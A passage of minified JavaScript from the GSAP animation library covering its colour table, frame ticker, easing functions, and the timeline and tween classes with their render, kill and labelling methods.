n,r,a=t.vars,o=a[e];if(o)return n=a[e+"Params"],r=a.callbackScope||t,i&&ae.length&&M(),n?o.apply(r,n):o.call(r)},be=255,we={aqua:[0,be,be],lime:[0,be,0],silver:[192,192,192],black:[0,0,0],maroon:[128,0,0],teal:[0,128,128],blue:[0,0,be],navy:[0,0,128],white:[be,be,be],olive:[128,128,0],yellow:[be,be,0],orange:[be,165,0],gray:[128,128,128],purple:[128,0,128],green:[0,128,0],red:[be,0,0],pink:[be,192,203],cyan:[0,be,be],transparent:[be,be,be,0]},_e=function(){var t,e="(?:\\b(?:(?:rgb|rgba|hsl|hsla)\\(.+?\\))|\\B#(?:[0-9a-f]{3}){1,2}\\b";for(t in we)e+="|"+t+"\\b";return new RegExp(e+")","gi")}(),Me=/hsl[a]?\(/,Se=(Lt=Date.now,Pt=500,Rt=33,Ot=Lt(),It=Ot,Dt=zt=1e3/240,Et={time:0,frame:0,tick:function(){Re(!0)},deltaRatio:function(t){return Ct/(1e3/(t||60))},wake:function(){xt&&(!gt&&c()&&(mt=gt=window,vt=mt.document||{},ne.gsap=hi,(mt.gsapVersions||(mt.gsapVersions=[])).push(hi.version),u(yt||mt.GreenSockGlobals||!mt.gsap&&mt||{}),Tt=mt.requestAnimationFrame),Mt&&Et.sleep(),St=Tt||function(t){return setTimeout(t,Dt-1e3*Et.time+1|0)},_t=1,Re(2))},sleep:function(){(Tt?mt.cancelAnimationFrame:clearTimeout)(Mt),_t=0,St=m},lagSmoothing:function(t,e){Pt=t||1e8,Rt=Math.min(e,Pt,0)},fps:function(t){zt=1e3/(t||240),Dt=1e3*Et.time+zt},add:function(t){Nt.indexOf(t)<0&&Nt.push(t),Te()},remove:function(t){var e;~(e=Nt.indexOf(t))&&Nt.splice(e,1)&&e<=At&&At--},_listeners:Nt=[]}),Te=function(){return!_t&&Se.wake()},Ee={},Ce=/^[\d.\-M][\d.\-,\s]/,Ae=/["']/g,Le=function(t){return function(e){return 1-t(1-e)}},Pe=function(t,e){return t&&(r(t)?t:Ee[t]||function(t){var e=(t+"").split("("),i=Ee[e[0]];return i&&1<e.length&&i.config?i.config.apply(null,~t.indexOf("{")?[function(t){for(var e,i,n,r={},a=t.substr(1,t.length-3).split(":"),o=a[0],s=1,l=a.length;s<l;s++)i=a[s],e=s!==l-1?i.lastIndexOf(","):i.length,n=i.substr(0,e),r[o]=isNaN(n)?n.replace(Ae,"").trim():+n,o=i.substr(e+1).trim();return r}(e[1])]:function(t){var e=t.indexOf("(")+1,i=t.indexOf(")"),n=t.indexOf("(",e);return t.substring(e,~n&&n<i?t.indexOf(")",i+1):i)}(t).split(",").map(T)):Ee._CE&&Ce.test(t)?Ee._CE("",t):i}(t))||e};function Re(t){var e,i,n,r,a=Lt()-It,o=!0===t;if(Pt<a&&(Ot+=a-Rt),(0<(e=(n=(It+=a)-Ot)-Dt)||o)&&(r=++Et.frame,Ct=n-1e3*Et.time,Et.time=n/=1e3,Dt+=e+(zt<=e?4:zt-e),i=1),o||(Mt=St(Re)),i)for(At=0;At<Nt.length;At++)Nt[At](n,Ct,r,t)}function Oe(t){return t<Bt?kt*t*t:t<.7272727272727273?kt*Math.pow(t-1.5/2.75,2)+.75:t<.9090909090909092?kt*(t-=2.25/2.75)*t+.9375:kt*Math.pow(t-2.625/2.75,2)+.984375}x("Linear,Quad,Cubic,Quart,Quint,Strong",(function(t,e){var i=e<5?e+1:e;ht(t+",Power"+(i-1),e?function(t){return Math.pow(t,i)}:function(t){return t},(function(t){return 1-Math.pow(1-t,i)}),(function(t){return t<.5?Math.pow(2*t,i)/2:1-Math.pow(2*(1-t),i)/2}))})),Ee.Linear.easeNone=Ee.none=Ee.Linear.easeIn,ht("Elastic",dt("in"),dt("out"),dt()),kt=7.5625,Bt=1/2.75,ht("Bounce",(function(t){return 1-Oe(1-t)}),Oe),ht("Expo",(function(t){return t?Math.pow(2,10*(t-1)):0})),ht("Circ",(function(t){return-(qt(1-t*t)-1)})),ht("Sine",(function(t){return 1===t?1:1-Xt(t*Vt)})),ht("Back",pt("in"),pt("out"),pt()),Ee.SteppedEase=Ee.steps=ne.SteppedEase={config:function(t,e){void 0===t&&(t=1);var i=1/t,n=t+(e?0:1),r=e?1:0;return function(t){return((n*me(0,.99999999,t)|0)+r)*i}}},Ht.ease=Ee["quad.out"],x("onComplete,onUpdate,onStart,onRepeat,onReverseComplete,onInterrupt",(function(t){return ue+=t+","+t+"Params,"}));var Ie,ze=function(t,e){this.id=Wt++,(t._gsap=this).target=t,this.harness=e,this.get=e?e.get:y,this.set=e?e.getSetter:Je},De=((Ie=Ne.prototype).delay=function(t){return t||0===t?(this.parent&&this.parent.smoothChildTiming&&this.startTime(this._start+t-this._delay),this._delay=t,this):this._delay},Ie.duration=function(t){return arguments.length?this.totalDuration(0<this._repeat?t+(t+this._rDelay)*this._repeat:t):this.totalDuration()&&this._dur},Ie.totalDuration=function(t){return arguments.length?(this._dirty=0,U(this,this._repeat<0?t:(t-this._repeat*this._rDelay)/(this._repeat+1))):this._tDur},Ie.totalTime=function(t,e){if(Te(),!arguments.length)return this._tTime;var i=this._dp;if(i&&i.smoothChildTiming&&this._ts){for(B(this,t);i.parent;)i.parent._time!==i._start+(0<=i._ts?i._tTime/i._ts:(i.totalDuration()-i._tTime)/-i._ts)&&i.totalTime(i._tTime,!0),i=i.parent;!this.parent&&this._dp.autoRemoveChildren&&(0<this._ts&&t<this._tDur||this._ts<0&&0<t||!this._tDur&&!t)&&H(this._dp,this,this._start-this._delay)}return(this._tTime!==t||!this._dur&&!e||this._initted&&Math.abs(this._zTime)===jt||!t&&!this._initted&&(this.add||this._ptLookup))&&(this._ts||(this._pTime=t),S(this,t,e)),this},Ie.time=function(t,e){return arguments.length?this.totalTime(Math.min(this.totalDuration(),t+D(this))%this._dur||(t?this._dur:0),e):this._time},Ie.totalProgress=function(t,e){return arguments.length?this.totalTime(this.totalDuration()*t,e):this.totalDuration()?Math.min(1,this._tTime/this._tDur):this.ratio},Ie.progress=function(t,e){return arguments.length?this.totalTime(this.duration()*(!this._yoyo||1&this.iteration()?t:1-t)+D(this),e):this.duration()?Math.min(1,this._time/this._dur):this.ratio},Ie.iteration=function(t,e){var i=this.duration()+this._rDelay;return arguments.length?this.totalTime(this._time+(t-1)*i,e):this._repeat?pe(this._tTime,i)+1:1},Ie.timeScale=function(t){if(!arguments.length)return this._rts===-jt?0:this._rts;if(this._rts===t)return this;var e=this.parent&&this._ts?N(this.parent._time,this):this._tTime;return this._rts=+t||0,this._ts=this._ps||t===-jt?0:this._rts,function(t){for(var e=t.parent;e&&e.parent;)e._dirty=1,e.totalDuration(),e=e.parent;return t}(this.totalTime(me(-this._delay,this._tDur,e),!0))},Ie.paused=function(t){return arguments.length?(this._ps!==t&&((this._ps=t)?(this._pTime=this._tTime||Math.max(-this._delay,this.rawTime()),this._ts=this._act=0):(Te(),this._ts=this._rts,this.totalTime(this.parent&&!this.parent.smoothChildTiming?this.rawTime():this._tTime||this._pTime,1===this.progress()&&(this._tTime-=jt)&&Math.abs(this._zTime)!==jt))),this):this._ps},Ie.startTime=function(t){if(arguments.length){this._start=t;var e=this.parent||this._dp;return!e||!e._sort&&this.parent||H(e,this,t-this._delay),this}return this._start},Ie.endTime=function(t){return this._start+(l(t)?this.totalDuration():this.duration())/Math.abs(this._ts)},Ie.rawTime=function(t){var e=this.parent||this._dp;return e?t&&(!this._ts||this._repeat&&this._time&&this.totalProgress()<1)?this._tTime%(this._dur+this._rDelay):this._ts?N(e.rawTime(t),this):this._tTime:this._tTime},Ie.globalTime=function(t){for(var e=this,i=arguments.length?t:e.rawTime();e;)i=e._start+i/(e._ts||1),e=e._dp;return i},Ie.repeat=function(t){return arguments.length?(this._repeat=t,V(this)):this._repeat},Ie.repeatDelay=function(t){return arguments.length?(this._rDelay=t,V(this)):this._rDelay},Ie.yoyo=function(t){return arguments.length?(this._yoyo=t,this):this._yoyo},Ie.seek=function(t,e){return this.totalTime(W(this,t),l(e))},Ie.restart=function(t,e){return this.play().totalTime(t?-this._delay:0,l(e))},Ie.play=function(t,e){return null!=t&&this.seek(t,e),this.reversed(!1).paused(!1)},Ie.reverse=function(t,e){return null!=t&&this.seek(t||this.totalDuration(),e),this.reversed(!0).paused(!1)},Ie.pause=function(t,e){return null!=t&&this.seek(t,e),this.paused(!0)},Ie.resume=function(){return this.paused(!1)},Ie.reversed=function(t){return arguments.length?(!!t!==this.reversed()&&this.timeScale(-this._rts||(t?-jt:0)),this):this._rts<0},Ie.invalidate=function(){return this._initted=0,this._zTime=-jt,this},Ie.isActive=function(){var t,e=this.parent||this._dp,i=this._start;return!(e&&!(this._ts&&this._initted&&e.isActive()&&(t=e.rawTime(!0))>=i&&t<this.endTime(!0)-jt))},Ie.eventCallback=function(t,e,i){var n=this.vars;return 1<arguments.length?(e?(n[t]=e,i&&(n[t+"Params"]=i),"onUpdate"===t&&(this._onUpdate=e)):delete n[t],this):n[t]},Ie.then=function(t){var e=this;return new Promise((function(i){function n(){var t=e.then;e.then=null,r(a)&&(a=a(e))&&(a.then||a===e)&&(e.then=t),i(a),e.then=t}var a=r(t)?t:E;e._initted&&1===e.totalProgress()&&0<=e._ts||!e._tTime&&e._ts<0?n():e._prom=n}))},Ie.kill=function(){nt(this)},Ne);function Ne(t,e){var i=t.parent||ft;this.vars=t,this._delay=+t.delay||0,(this._repeat=t.repeat||0)&&(this._rDelay=t.repeatDelay||0,this._yoyo=!!t.yoyo||!!t.yoyoEase),this._ts=1,U(this,+t.duration,1,1),this.data=t.data,_t||Se.wake(),i&&H(i,this,e||0===e?e:i._time,1),t.reversed&&this.reverse(),t.paused&&this.paused(!0)}C(De.prototype,{_time:0,_start:0,_end:0,_tTime:0,_tDur:0,_dirty:0,_repeat:0,_yoyo:!1,parent:null,_initted:!1,_rDelay:0,_ts:1,_dp:0,ratio:0,_zTime:-jt,_prom:0,_ps:!1,_rts:1});var ke=function(t){function o(e,n){var r;return void 0===e&&(e={}),(r=t.call(this,e,n)||this).labels={},r.smoothChildTiming=!!e.smoothChildTiming,r.autoRemoveChildren=!!e.autoRemoveChildren,r._sort=l(e.sortChildren),r.parent&&F(r.parent,i(r)),e.scrollTrigger&&G(i(r),e.scrollTrigger),r}e(o,t);var s=o.prototype;return s.to=function(t,e,i,n){return new We(t,_(arguments,0,this),W(this,a(e)?n:i)),this},s.from=function(t,e,i,n){return new We(t,_(arguments,1,this),W(this,a(e)?n:i)),this},s.fromTo=function(t,e,i,n,r){return new We(t,_(arguments,2,this),W(this,a(e)?r:n)),this},s.set=function(t,e,i){return e.duration=0,e.parent=this,R(e).repeatDelay||(e.repeat=0),e.immediateRender=!!e.immediateRender,new We(t,e,W(this,i),1),this},s.call=function(t,e,i){return H(this,We.delayedCall(0,t,e),W(this,i))},s.staggerTo=function(t,e,i,n,r,a,o){return i.duration=e,i.stagger=i.stagger||n,i.onComplete=a,i.onCompleteParams=o,i.parent=this,new We(t,i,W(this,r)),this},s.staggerFrom=function(t,e,i,n,r,a,o){return i.runBackwards=1,R(i).immediateRender=l(i.immediateRender),this.staggerTo(t,e,i,n,r,a,o)},s.staggerFromTo=function(t,e,i,n,r,a,o,s){return n.startAt=i,R(n).immediateRender=l(n.immediateRender),this.staggerTo(t,e,n,r,a,o,s)},s.render=function(t,e,i){var n,r,a,o,s,l,c,h,u,d,p,f,m=this._time,g=this._dirty?this.totalDuration():this._tDur,v=this._dur,y=this!==ft&&g-jt<t&&0<=t?g:t<jt?0:t,x=this._zTime<0!=t<0&&(this._initted||!v);if(y!==this._tTime||i||x){if(m!==this._time&&v&&(y+=this._time-m,t+=this._time-m),n=y,u=this._start,l=!(h=this._ts),x&&(v||(m=this._zTime),!t&&e||(this._zTime=t)),this._repeat&&(p=this._yoyo,n=b(y%(s=v+this._rDelay)),y===g?(o=this._repeat,n=v):((o=~~(y/s))&&o===y/s&&(n=v,o--),v<n&&(n=v)),d=pe(this._tTime,s),!m&&this._tTime&&d!==o&&(d=o),p&&1&o&&(n=v-n,f=1),o!==d&&!this._lock)){var w=p&&1&d,_=w===(p&&1&o);if(o<d&&(w=!w),m=w?0:v,this._lock=1,this.render(m||(f?0:b(o*s)),e,!v)._lock=0,!e&&this.parent&&xe(this,"onRepeat"),this.vars.repeatRefresh&&!f&&(this.invalidate()._lock=1),m!==this._time||l!=!this._ts)return this;if(v=this._dur,g=this._tDur,_&&(this._lock=2,m=w?v:-1e-4,this.render(m,!0),this.vars.repeatRefresh&&!f&&this.invalidate()),this._lock=0,!this._ts&&!l)return this;ct(this,f)}if(this._hasPause&&!this._forcing&&this._lock<2&&(c=function(t,e,i){var n;if(e<i)for(n=t._first;n&&n._start<=i;){if(!n._dur&&"isPause"===n.data&&n._start>e)return n;n=n._next}else for(n=t._last;n&&n._start>=i;){if(!n._dur&&"isPause"===n.data&&n._start<e)return n;n=n._prev}}(this,b(m),b(n)))&&(y-=n-(n=c._start)),this._tTime=y,this._time=n,this._act=!h,this._initted||(this._onUpdate=this.vars.onUpdate,this._initted=1,this._zTime=t),m||!n||e||xe(this,"onStart"),m<=n&&0<=t)for(r=this._first;r;){if(a=r._next,(r._act||n>=r._start)&&r._ts&&c!==r){if(r.parent!==this)return this.render(t,e,i);if(r.render(0<r._ts?(n-r._start)*r._ts:(r._dirty?r.totalDuration():r._tDur)+(n-r._start)*r._ts,e,i),n!==this._time||!this._ts&&!l){c=0,a&&(y+=this._zTime=-jt);break}}r=a}else{r=this._last;for(var M=t<0?t:n;r;){if(a=r._prev,(r._act||M<=r._end)&&r._ts&&c!==r){if(r.parent!==this)return this.render(t,e,i);if(r.render(0<r._ts?(M-r._start)*r._ts:(r._dirty?r.totalDuration():r._tDur)+(M-r._start)*r._ts,e,i),n!==this._time||!this._ts&&!l){c=0,a&&(y+=this._zTime=M?-jt:jt);break}}r=a}}if(c&&!e&&(this.pause(),c.render(m<=n?0:-jt)._zTime=m<=n?1:-1,this._ts))return this._start=u,k(this),this.render(t,e,i);this._onUpdate&&!e&&xe(this,"onUpdate",!0),(y===g&&g>=this.totalDuration()||!y&&m)&&(u!==this._start&&Math.abs(h)===Math.abs(this._ts)||this._lock||(!t&&v||!(y===g&&0<this._ts||!y&&this._ts<0)||I(this,1),e||t<0&&!m||!y&&!m||(xe(this,y===g?"onComplete":"onReverseComplete",!0),!this._prom||y<g&&0<this.timeScale()||this._prom())))}return this},s.add=function(t,e){var i=this;if(a(e)||(e=W(this,e)),!(t instanceof De)){if(Zt(t))return t.forEach((function(t){return i.add(t,e)})),this;if(n(t))return this.addLabel(t,e);if(!r(t))return this;t=We.delayedCall(0,t)}return this!==t?H(this,t,e):this},s.getChildren=function(t,e,i,n){void 0===t&&(t=!0),void 0===e&&(e=!0),void 0===i&&(i=!0),void 0===n&&(n=-Gt);for(var r=[],a=this._first;a;)a._start>=n&&(a instanceof We?e&&r.push(a):(i&&r.push(a),t&&r.push.apply(r,a.getChildren(!0,e,i)))),a=a._next;return r},s.getById=function(t){for(var e=this.getChildren(1,1,1),i=e.length;i--;)if(e[i].vars.id===t)return e[i]},s.remove=function(t){return n(t)?this.removeLabel(t):r(t)?this.killTweensOf(t):(O(this,t),t===this._recent&&(this._recent=this._last),z(this))},s.totalTime=function(e,i){return arguments.length?(this._forcing=1,!this._dp&&this._ts&&(this._start=b(Se.time-(0<this._ts?e/this._ts:(this.totalDuration()-e)/-this._ts))),t.prototype.totalTime.call(this,e,i),this._forcing=0,this):this._tTime},s.addLabel=function(t,e){return this.labels[t]=W(this,e),this},s.removeLabel=function(t){return delete this.labels[t],this},s.addPause=function(t,e,i){var n=We.delayedCall(0,e||m,i);return n.data="isPause",this._hasPause=1,H(this,n,W(this,t))},s.removePause=function(t){var e=this._first;for(t=W(this,t);e;)e._start===t&&"isPause"===e.data&&I(e),e=e._next},s.killTweensOf=function(t,e,i){for(var n=this.getTweensOf(t,i),r=n.length;r--;)Fe!==n[r]&&n[r].kill(t,e);return this},s.getTweensOf=function(t,e){for(var i,n=[],r=ve(t),o=this._first,s=a(e);o;)o instanceof We?w(o._targets,r)&&(s?(!Fe||o._initted&&o._ts)&&o.globalTime(0)<=e&&o.globalTime(o.totalDuration())>e:!e||o.isActive())&&n.push(o):(i=o.getTweensOf(r,e)).length&&n.push.apply(n,i),o=o._next;return n},s.tweenTo=function(t,e){e=e||{};var i=this,n=W(i,t),r=e.startAt,a=e.onStart,o=e.onStartParams,s=We.to(i,C(e,{ease:"none",lazy:!1,time:n,overwrite:"auto",duration:e.duration||Math.abs((n-(r&&"time"in r?r.time:i._time))/i.timeScale())||jt,onStart:function(){i.pause();var t=e.duration||Math.abs((n-i._time)/i.timeScale());s._dur!==t&&U(s,t,0,1).render(s._time,!0,!0),a&&a.apply(s,o||[])}}));return s},s.tweenFromTo=function(t,e,i){return this.tweenTo(e,C({startAt:{time:W(this,t)}},i))},s.recent=function(){return this._recent},s.nextLabel=function(t){return void 0===t&&(t=this._time),it(this,W(this,t))},s.previousLabel=function(t){return void 0===t&&(t=this._time),it(this,W(this,t),1)},s.currentLabel=function(t){return arguments.length?this.seek(t,!0):this.previousLabel(this._time+jt)},s.shiftChildren=function(t,e,i){void 0===i&&(i=0);for(var n,r=this._first,a=this.labels;r;)r._start>=i&&(r._start+=t,r._end+=t),r=r._next;if(e)for(n in a)a[n]>=i&&(a[n]+=t);return z(this)},s.invalidate=function(){var e=this._first;for(this._lock=0;e;)e.invalidate(),e=e._next;return t.prototype.invalidate.call(this)},s.clear=function(t){void 0===t&&(t=!0);for(var e,i=this._first;i;)e=i._next,this.remove(i),i=e;return this._time=this._tTime=this._pTime=0,t&&(this.labels={}),z(this)},s.totalDuration=function(t){var e,i,n,r=0,a=this,o=a._last,s=Gt;if(arguments.length)return a.timeScale((a._repeat<0?a.duration():a.totalDuration())/(a.reversed()?-t:t));if(a._dirty){for(n=a.parent;o;)e=o._prev,o._dirty&&o.totalDuration(),s<(i=o._start)&&a._sort&&o._ts&&!a._lock?(a._lock=1,H(a,o,i-o._delay,1)._lock=0):s=i,i<0&&o._ts&&(r-=i,(!n&&!a._dp||n&&n.smoothChildTiming)&&(a._start+=i/a._ts,a._time-=i,a._tTime-=i),a.shiftChildren(-i,!1,-1/0),s=0),o._end>r&&o._ts&&(r=o._end),o=e;U(a,a===ft&&a._time>r?a._time:r,1,1),a._dirty=0}return a._tDur},o.updateRoot=function(t){if(ft._ts&&(S(ft,N(t,ft)),bt=Se.frame),Se.frame>=ce){ce+=Ft.autoSleep||120;var e=ft._first;if((!e||!e._ts)&&Ft.autoSleep&&Se._listeners.length<2){for(;e&&!e._ts;)e=e._next;e||Se.sleep()}}},o}(De);function Be(t,e,i,a,o,l){var c,h,u,d;if(se[t]&&!1!==(c=new se[t]).init(o,c.rawVars?e[t]:function(t,e,i,a,o){if(r(t)&&(t=je(t,o,e,i,a)),!s(t)||t.style&&t.nodeType||Zt(t)||$t(t))return n(t)?je(t,o,e,i,a):t;var l,c={};for(l in t)c[l]=je(t[l],o,e,i,a);return c}(e[t],a,o,l,i),i,a,l)&&(i._pt=h=new ai(i._pt,o,t,0,1,c.render,c,0,c.priority),i!==wt))for(u=i._ptLookup[i._targets.indexOf(o)],d=c._props.length;d--;)u[c._props[d]]=h;return c}C(ke.prototype,{_lock:0,_hasPause:0,_forcing:0});var Fe,He=function(t,e,i,a,o,s,l,c,h){r(a)&&(a=a(o||0,t,s));var u,p=t[e],f="get"!==i?i:r(p)?h?t[e.indexOf("set")||!r(t["get"+e.substr(3)])?e:"get"+e.substr(3)](h):t[e]():p,m=r(p)?h?Ze:$e:Ye;if(n(a)&&(~a.indexOf("random(")&&(a=et(a)),"="===a.charAt(1)&&(a=parseFloat(f)+parseFloat(a.substr(2))*("-"===a.charAt(0)?-1:1)+(X(f)||0))),f!==a)return isNaN(f*a)?(p||e in t||d(e,a),function(t,e,i,n,r,a,o){var s,l,c,h,u,d,p,f,m=new ai(this._pt,t,e,0,1,ti,null,r),g=0,v=0;for(m.b=i,m.e=n,i+="",(p=~(n+="").indexOf("random("))&&(n=et(n)),a&&(a(f=[i,n],t,e),i=f[0],n=f[1]),l=i.match(te)||[];s=te.exec(n);)h=s[0],u=n.substring(g,s.index),c?c=(c+1)%5:"rgba("===u.substr(-5)&&(c=1),h!==l[v++]&&(d=parseFloat(l[v-1])||0,m._pt={_next:m._pt,p:u||1===v?u:",",s:d,c:"="===h.charAt(1)?parseFloat(h.substr(2))*("-"===h.charAt(0)?-1:1):parseFloat(h)-d,m:c&&c<4?Math.round:0},g=te.lastIndex);return m.c=g<n.length?n.substring(g,n.length):"",m.fp=o,(ee.test(n)||p)&&(m.e=0),this._pt=m}.call(this,t,e,f,a,m,c||Ft.stringFilter,h)):(u=new ai(this._pt,t,e,+f||0,a-(f||0),"boolean"==typeof p?Qe:Ke,0,m),h&&(u.fp=h),l&&u.modifier(l,this,t),this._pt=u)},Ge=function t(e,i){var n,r,a,o,s,c,h,u,d,p,f,m,y,x=e.vars,b=x.ease,w=x.startAt,_=x.immediateRender,S=x.lazy,T=x.onUpdate,E=x.onUpdateParams,A=x.callbackScope,L=x.runBackwards,R=x.yoyoEase,O=x.keyframes,z=x.autoRevert,D=e._dur,N=e._startAt,k=e._targets,B=e.parent,F=B&&"nested"===B.data?B.parent._targets:k,H="auto"===e._overwrite,G=e.timeline;if(!G||O&&b||(b="none"),e._ease=Pe(b,Ht.ease),e._yEase=R?Le(Pe(!0===R?b:R,Ht.ease)):0,R&&e._yoyo&&!e._repeat&&(R=e._yEase,e._yEase=e._ease,e._ease=R),!G){if(m=(u=k[0]?v(k[0]).harness:0)&&x[u.prop],n=P(x,re),N&&N.render(-1,!0).kill(),w){if(I(e._startAt=We.set(k,C({data:"isStart",overwrite:!1,parent:B,immediateRender:!0,lazy:l(S),startAt:null,delay:0,onUpdate:T,onUpdateParams:E,callbackScope:A,stagger:0},w))),_)if(0<i)z||(e._startAt=0);else if(D&&!(i<0&&N))return void(i&&(e._zTime=i))}else if(L&&D)if(N)z||(e._startAt=0);else if(i&&(_=!1),a=C({overwrite:!1,data:"isFromStart",lazy:_&&l(S),immediateRender:_,stagger:0,parent:B},n),m&&(a[u.prop]=m),I(e._startAt=We.set(k,a)),_){if(!i)return}else t(e._startAt,jt);for(e._pt=0,S=D&&l(S)||S&&!D,r=0;r<k.length;r++){if(h=(s=k[r])._gsap||g(k)[r]._gsap,e._ptLookup[r]=p={},oe[h.id]&&ae.length&&M(),f=F===k?r:F.indexOf(s),u&&!1!==(d=new u).init(s,m||n,e,f,F)&&(e._pt=o=new ai(e._pt,s,d.name,0,1,d.render,d,0,d.priority),d._props.forEach((function(t){p[t]=o})),d.priority&&(c=1)),!u||m)for(a in n)se[a]&&(d=Be(a,n,e,f,s,F))?d.priority&&(c=1):p[a]=o=He.call(e,s,a,"get",n[a],f,F,0,x.stringFilter);e._op&&e._op[r]&&e.kill(s,e._op[r]),H&&e._pt&&(Fe=e,ft.killTweensOf(s,p,e.globalTime(0)),y=!e.parent,Fe=0),e._pt&&S&&(oe[h.id]=1)}c&&ri(e),e._onInit&&e._onInit(e)}e._from=!G&&!!x.runBackwards,e._onUpdate=T,e._initted=(!e._op||e._pt)&&!y},je=function(t,e,i,a,o){return r(t)?t.call(e,i,a,o):n(t)&&~t.indexOf("random(")?et(t):t},Ue=ue+"repeat,repeatDelay,yoyo,repeatRefresh,yoyoEase",Ve=(Ue+",id,stagger,delay,duration,paused,scrollTrigger").split(","),We=function(t){function r(e,n,r,o){var c;"number"==typeof n&&(r.duration=n,n=r,r=null);var u,d,f,v,y,x,w,_,M=(c=t.call(this,o?n:R(n),r)||this).vars,S=M.duration,T=M.delay,E=M.immediateRender,A=M.stagger,L=M.overwrite,P=M.keyframes,O=M.defaults,I=M.scrollTrigger,z=M.yoyoEase,D=c.parent,N=(Zt(e)||$t(e)?a(e[0]):"length"in n)?[e]:ve(e);if(c._targets=N.length?g(N):p("GSAP target "+e+" not found. https://greensock.com",!Ft.nullTargetWarn)||[],c._ptLookup=[],c._overwrite=L,P||A||h(S)||h(T)){if(n=c.vars,(u=c.timeline=new ke({data:"nested",defaults:O||{}})).kill(),u.parent=i(c),P)C(u.vars.defaults,{ease:"none"}),P.forEach((function(t){return u.to(N,t,">")}));else{if(v=N.length,w=A?Z(A):m,s(A))for(y in A)~Ue.indexOf(y)&&((_=_||{})[y]=A[y]);for(d=0;d<v;d++){for(y in f={},n)Ve.indexOf(y)<0&&(f[y]=n[y]);f.stagger=0,z&&(f.yoyoEase=z),_&&de(f,_),x=N[d],f.duration=+je(S,i(c),d,x,N),f.delay=(+je(T,i(c),d,x,N)||0)-c._delay,!A&&1===v&&f.delay&&(c._delay=T=f.delay,c._start+=T,f.delay=0),u.to(x,f,w(d,x,N))}u.duration()?S=T=0:c.timeline=0}S||c.duration(S=u.duration())}else c.timeline=0;return!0===L&&(Fe=i(c),ft.killTweensOf(N),Fe=0),D&&F(D,i(c)),(E||!S&&!P&&c._start===b(D._time)&&l(E)&&function t(e){return!e||e._ts&&t(e.parent)}(i(c))&&"nested"!==D.data)&&(c._tTime=-jt,c.render(Math.max(0,-T))),I&&G(i(c),I),c}e(r,t);var o=r.prototype;return o.render=function(t,e,i){var n,r,a,o,s,l,c,h,u,d=this._time,p=this._tDur,f=this._dur,m=p-jt<t&&0<=t?p:t<jt?0:t;if(f){if(m!==this._tTime||!t||i||this._startAt&&this._zTime<0!=t<0){if(n=m,h=this.timeline,this._repeat){if(n=b(m%(o=f+this._rDelay)),m===p?(a=this._repeat,n=f):((a=~~(m/o))&&a===m/o&&(n=f,a--),f<n&&(n=f)),(l=this._yoyo&&1&a)&&(u=this._yEase,n=f-n),s=pe(this._tTime,o),n===d&&!i&&this._initted)return this;a!==s&&(h&&this._yEase&&ct(h,l),!this.vars.repeatRefresh||l||this._lock||(this._lock=i=1,this.render(b(o*a),!0).invalidate()._lock=0))}if(!this._initted){if(j(this,t<0?t:n,i,e))return this._tTime=0,this;if(f!==this._dur)return this.render(t,e,i)}for(this._tTime=m,this._time=n,!this._act&&this._ts&&(this._act=1,this._lazy=0),this.ratio=c=(u||this._ease)(n/f),this._from&&(this.ratio=c=1-c),!n||d||e||xe(this,"onStart"),r=this._pt;r;)r.r(c,r.d),r=r._next;h&&h.render(t<0?t:!n&&l?-jt:h._dur*c,e,i)||this._startAt&&(this._zTime=t),this._onUpdate&&!e&&(t<0&&this._startAt&&this._startAt.render(t,!0,i),xe(this,"onUpdate")),this._repeat&&a!==s&&this.vars.onRepeat&&!e&&this.parent&&xe(this,"onRepeat"),m!==this._tDur&&m||this._tTime!==m||(t<0&&this._startAt&&!this._onUpdate&&this._startAt.render(t,!0,!0),!t&&f||!(m===this._tDur&&0<this._ts||!m&&this._ts<0)||I(this,1),e||t<0&&!d||!m&&!d||(xe(this,m===p?"onComplete":"onReverseComplete",!0),!this._prom||m<p&&0<this.timeScale()||this._prom()))}}else!function(t,e,i,n){var r,a,o=t.ratio,s=e<0||!e&&o&&!t._start&&t._zTime>jt&&!t._dp._lock||(t._ts<0||t._dp._ts<0)&&"isFromStart"!==t.data&&"isStart"!==t.data?0:1,l=t._rDelay,c=0;if(l&&t._repeat&&(c=me(0,t._tDur,e),pe(c,l)!==(a=pe(t._tTime,l))&&(o=1-s,t.vars.repeatRefresh&&t._initted&&t.invalidate())),s!==o||n||t._zTime===jt||!e&&t._zTime){if(!t._initted&&j(t,e,n,i))return;for(a=t._zTime,t._zTime=e||(i?jt:0),i=i||e&&!a,t.ratio=s,t._from&&(s=1-s),t._time=0,t._tTime=c,i||xe(t,"onStart"),r=t._pt;r;)r.r(s,r.d),r=r._next;t._startAt&&e<0&&t._startAt.render(e,!0,!0),t._onUpdate&&!i&&xe(t,"onUpdate"),c&&t._repeat&&!i&&t.parent&&xe(t,"onRepeat"),(e>=t._tDur||e<0)&&t.ratio===s&&(s&&I(t,1),i||(xe(t,s?"onComplete":"onReverseComplete",!0),t._prom&&t._prom()))}else t._zTime||(t._zTime=e)}(this,t,e,i);return this},o.targets=function(){return this._targets},o.invalidate=function(){return this._pt=this._op=this._startAt=this._onUpdate=this._act=this._lazy=0,this._ptLookup=[],this.timeline&&this.timeline.invalidate(),t.prototype.invalidate.call(this)},o.kill=function(t,e){if(void 0===e&&(e="all"),!(t||e&&"all"!==e)&&(this._lazy=0,this.parent))return nt(this);if(this.timeline){var i=this.timeline.totalDuration();return this.timeline.killTweensOf(t,e,Fe&&!0!==Fe.vars.overwrite)._first||nt(this),this.parent&&i!==this.timeline.totalDuration()&&U(this,this._dur*this.timeline._tDur/i,0,1),this}var r,a,o,s,l,c,h,u=this._targets,d=t?ve(t):u,p=this._ptLookup,f=this._pt;if((!e||"all"===e)&&function(t,e){for(var i=t.length,n=i===e.length;n&&i--&&t[i]===e[i];);return i<0}(u,d))return"all"===e&&(this._pt=0),nt(this);for(r=this._op=this._op||[],"all"!==e&&(n(e)&&(l={},x(e,(function(t){return l[t]=1})),e=l),e=function(t,e){var i,n,r,a,o=t[0]?v(t[0]).harness:0,s=o&&o.aliases;if(!s)return e;for(n in i=de({},e),s)if(n in i)for(r=(a=s[n].split(",")).length;r--;)i[a[r]]=i[n];return i}(u,e)),h=u.length;h--;)if(~d.indexOf(u[h]))for(l in a=p[h],"all"===e?(r[h]=e,s=a,o={}):(o=r[h]=r[h]||{},s=e),s)(c=a&&a[l])&&("kill"in c.d&&!0!==c.d.kill(l)||O(this,c,"_pt"),delete a[l]),"all"!==o&&(o[l]=1);return this._initted&&!this._pt&&f&&nt(this),this},r.to=function(t,e,i){return new r(t,e,i)},r.from=function(t,e){return new r(t,_(arguments,1))},r.delayedCall=function(t,e,i,n){return new 